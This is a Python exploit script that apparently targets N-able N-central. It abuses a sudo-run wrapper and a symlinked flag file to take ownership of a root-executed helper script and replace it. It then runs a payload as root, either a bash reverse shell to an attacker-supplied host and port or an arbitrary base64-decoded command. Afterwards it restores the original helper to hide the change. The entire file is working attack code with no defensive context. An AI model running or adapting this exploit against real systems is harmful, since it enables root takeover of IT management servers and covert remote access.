#!/usr/bin/env python3
import argparse
import base64
import os
from pathlib import Path
import secrets
import shutil
import subprocess

WRAPPER = "/opt/nable/usr/sbin/nable_wrapper.pl"
SERVER_CHILD = Path("/opt/nable/var/ncsai/scripts/ServerChild.sh")
FLAG = Path("/var/opt/n-central/flag/flag_default.json")
TMP = Path("/var/opt/n-central/tmp")

parser = argparse.ArgumentParser()
parser.add_argument("--encoded-command")
parser.add_argument("--lhost")
parser.add_argument("--lport", type=int)
args = parser.parse_args()
if os.geteuid() == 0:
    raise SystemExit("run as nable")
if FLAG.exists() or FLAG.is_symlink():
    raise SystemExit(f"refusing existing {FLAG}")

suffix = secrets.token_hex(6)
backup = TMP / f"serverchild-{suffix}.bak"
stage2 = TMP / f"serverchild-{suffix}.sh"
result = TMP / f"serverchild-{suffix}.out"
original_hash = subprocess.check_output(["sha256sum", str(SERVER_CHILD)], text=True).split()[0]
writable_before = os.access(SERVER_CHILD, os.W_OK)
shutil.copy2(SERVER_CHILD, backup)

if args.lhost:
    root_effect = f'exec /bin/bash -c "/bin/bash -i >& /dev/tcp/{args.lhost}/{args.lport} 0>&1"'
else:
    root_effect = (
        f'out=$(echo {args.encoded_command}|/usr/bin/base64 -d|/bin/bash 2>&1);'
        f'/usr/bin/printf "%s\\n" "$out" > {result};'
        f'/usr/bin/chown {os.geteuid()}:{os.getegid()} {result}'
    )

stage2.write_text(
    "#!/usr/bin/env bash\n"
    f"/usr/bin/cp --force {backup} {SERVER_CHILD}\n"
    f"/usr/bin/chown root:root {SERVER_CHILD}\n"
    f"/usr/bin/chmod 0755 {SERVER_CHILD}\n"
    f"/usr/bin/rm --force {FLAG} {backup}\n"
    f"/usr/bin/rm --force -- {stage2}\n"
    f"{root_effect}\n"
)
stage2.chmod(0o700)
FLAG.symlink_to(SERVER_CHILD)
subprocess.run(["sudo", WRAPPER, "setLDFileOwner"], check=True)
writable_after = os.access(SERVER_CHILD, os.W_OK)
SERVER_CHILD.write_text("#!/usr/bin/env bash\n" f"exec /bin/bash {stage2}\n")
SERVER_CHILD.chmod(0o755)
subprocess.run(["sudo", WRAPPER, "serverControl", "noop", "--wait"], check=True)

final_hash = subprocess.check_output(["sha256sum", str(SERVER_CHILD)], text=True).split()[0]
final_stat = SERVER_CHILD.stat()
print(f"write_before={str(writable_before).lower()}")
print(f"write_after={str(writable_after).lower()}")
print(f"helper_restored={str(final_hash == original_hash and final_stat.st_uid == 0).lower()}")
if result.exists():
    print(result.read_text().strip())
    result.unlink()
